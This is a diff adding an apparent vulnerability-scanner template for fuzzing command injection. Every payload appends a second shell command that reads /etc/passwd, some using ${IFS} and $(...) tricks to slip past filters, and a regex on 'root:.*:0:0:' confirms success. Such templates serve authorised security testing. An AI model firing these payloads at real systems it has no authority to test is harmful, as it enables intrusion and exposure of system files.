@@ -1,0 +1,23 @@
+id: cmdi_fuzz
+info:
+  name: Command Injection
+  author: abhijit
+  severity: critical
+
+requests:
+  - raw:
+      - |
+{{RAW_REQUESTS}}
+    payloads:
+      injection:
+        - "127.0.0.1 -c 1;cat /etc/passwd"
+        - "127.0.0.1 -c 1;$(cat /etc/passwd)"
+        - "127.0.0.1 -c 1;cat</etc/passwd"
+        - "127.0.0.1 -c 1;cat${IFS}/etc/passwd"
+        - "127.0.0.1 -c 1;echo${IFS}'RCE'${IFS}&&cat${IFS}/etc/passwd"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
